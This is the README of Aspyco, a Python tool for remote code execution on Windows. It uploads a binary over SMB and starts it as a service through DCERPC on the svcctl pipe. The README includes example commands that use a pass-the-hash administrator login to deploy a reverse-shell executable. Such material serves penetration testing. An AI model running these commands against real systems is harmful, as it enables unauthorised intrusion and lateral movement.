# Aspyco

<div align="center">
  <br>
  <img src="https://img.shields.io/badge/Python-3.6+-informational">
  <br>
  <a href="https://twitter.com/intent/follow?screen_name=ProcessusT" title="Follow"><img src="https://img.shields.io/twitter/follow/ProcessusT?label=ProcessusT&style=social"></a>
  <br>
  <h1>
    Inject your own venom 💉
  </h1>
  <br><br>
</div>

> Aspyco is a python script that permits to upload a local binary through SMB on a remote host.<br />
> Then it remotely connects to svcctl named pipe through DCERPC to create and start the binary as a service.<br />
> <br />
> It's a psexec-like with custom execution !!
> <br />
<br>
<div align="center">
	<!--
<img src="future img" width="80%;">
	-->
</div>
<br>


## Changelog
<br />
V 1.0<br />
- Can inject custom payload on remote host

<br /><br />

## What da fuck is this ?
<br />
On Windows, RPC protocol permits to call remote functions.<br />
Remotely, you can connect on SMB named pipe to call functions with DCERPC protocol.<br />
In that way, you can upload a binary file through SMB and then call some functions<br />
to create a service to execute your payload.
<br />
<br />

## Installation
<br>
From Pypi :
<br><br>

```python
coming soon
```

<br>
From sources :
<br><br>

```python
git clone https://github.com/Processus-Thief/Aspyco
cd Aspyco
python3 aspyco.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 custom_reverse_shell.exe
```

<br><br>


## Usage
<br>
Aspyco uses Impacket syntax :
<br><br>

```python
usage: launcher.py [-h] [-hashes LMHASH:NTHASH] target payload

Upload and start your custom payloads remotely !

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  payload               Your custom binary file

options:
  -h, --help            show this help message and exit
  -hashes LMHASH:NTHASH	NTLM hashes, format is LMHASH:NTHASH
```

<br>
<br>

## Example

<br>

```python
python3 aspyco.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 custom_reverse_shell.exe
```

<br>
<br>
